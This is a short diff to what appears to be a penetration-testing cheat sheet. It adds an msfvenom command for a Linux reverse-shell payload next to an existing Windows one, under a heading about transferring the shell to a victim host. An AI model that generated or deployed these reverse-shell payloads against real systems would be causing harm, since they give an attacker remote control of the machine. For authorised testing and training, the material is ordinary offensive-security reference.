@@ -4,6 +4,9 @@ https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 ```
 # Basic Windows shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+
+# Basic Linux shell
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
 ```
 
 ## Transfer the shell to the victim host
